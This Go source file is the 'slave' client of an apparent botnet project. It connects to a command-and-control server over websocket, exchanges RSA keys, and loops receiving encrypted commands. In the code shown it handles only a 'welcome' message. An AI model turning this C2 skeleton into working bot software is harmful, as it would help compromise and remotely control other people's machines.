package slave

import (
	"crypto/rsa"
	"encoding/json"
	"fmt"
	"log"
	"os"
	"os/signal"
	"time"

	"github.com/gorilla/websocket"

	"github.com/adrianosela/botnet/lib/encryption"
	"github.com/adrianosela/botnet/lib/protocol"
	"github.com/adrianosela/botnet/master"
)

const (
	writeWait      = 10 * time.Second    // Time allowed to write a message to the peer
	pongWait       = 60 * time.Second    // Time allowed to read the next pong message from the peer
	pingPeriod     = (pongWait * 9) / 10 // Send pings to peer with this period. Must be less than pongWait
	maxMessageSize = 512                 // Maximum message size allowed from peer
)

// BotnetSlave is the slave program controller
type BotnetSlave struct {
	masterAddr   string
	masterPubKey *rsa.PublicKey
	slavePrivKey *rsa.PrivateKey
	slavePubKey  string
}

// NewBotnetSlave initializes a BotnetSlave to its master
func NewBotnetSlave(masterAddr string) (*BotnetSlave, error) {
	masterPubKey, rawPEM, err := getMasterPubKey(masterAddr)
	if err != nil {
		return nil, err
	}
	log.Printf("[slave] fetched master pub key: \n%s", rawPEM)
	slavePriv, slavePub, err := encryption.GenerateRSAKeyPair(4096)
	if err != nil {
		return nil, err
	}
	return &BotnetSlave{
		masterAddr:   masterAddr,
		masterPubKey: masterPubKey,
		slavePrivKey: slavePriv,
		slavePubKey:  string(slavePub),
	}, nil
}

// Start runs the initialized slave process
func (s *BotnetSlave) Start() {
	interrupt := make(chan os.Signal, 1)
	signal.Notify(interrupt, os.Interrupt)

	url := fmt.Sprintf("ws://%s%s", s.masterAddr, master.JoinEndpoint)
	c, _, err := websocket.DefaultDialer.Dial(url, nil)
	if err != nil {
		log.Fatal("dial:", err)
	}
	defer c.Close()
	log.Printf("[slave] initiated websockets connection to command and control server at: %s", url)

	// send encrypted join request completing the handshake
	encrypted, err := buildEncryptedJoinRequest(s.slavePubKey, s.masterPubKey)
	if err != nil {
		log.Fatal(err)
	}
	log.Println("[slave] built and encrypted botnet join request with master key...")

	c.WriteMessage(2, []byte(encrypted)) // binary message type (2)
	log.Println("[slave] sent encrypted join request to command and control server...")

	c.SetReadLimit(maxMessageSize)
	c.SetReadDeadline(time.Now().Add(pongWait))
	c.SetPongHandler(func(string) error { c.SetReadDeadline(time.Now().Add(pongWait)); return nil })

	for {
		log.Println("[slave] waiting for command and control...")
		msgType, encryptedMessage, err := c.ReadMessage()
		if err != nil {
			if websocket.IsUnexpectedCloseError(err, websocket.CloseGoingAway, websocket.CloseAbnormalClosure) {
				log.Printf("WS connection was closed unexpectedly: %s", err)
			}
			break
		}
		// discard all non binary messages
		if msgType != 2 {
			continue
		}
		jsonMsg, err := encryption.DecryptMessage(encryptedMessage, s.slavePrivKey)
		if err != nil {
			log.Printf("could not decrypt message from master: %s", err)
			continue
		}
		var cmd protocol.Command
		if err = json.Unmarshal(jsonMsg, &cmd); err != nil {
			log.Printf("could not unmarshal message from master: %s", err)
			continue
		}
		handleCommand(cmd)
	}
}

// handleCommand handles a single command from the master node
func handleCommand(c protocol.Command) {
	switch c.Type {
	case protocol.CommandTypeWelcome:
		log.Printf("[master] WELCOME!!! joined botnet at unix time: %d", time.Now().UnixNano())
		return
	default:
		log.Printf("received unknown event type at %d, full command: %v", time.Now().UnixNano(), c)
		return
	}
}
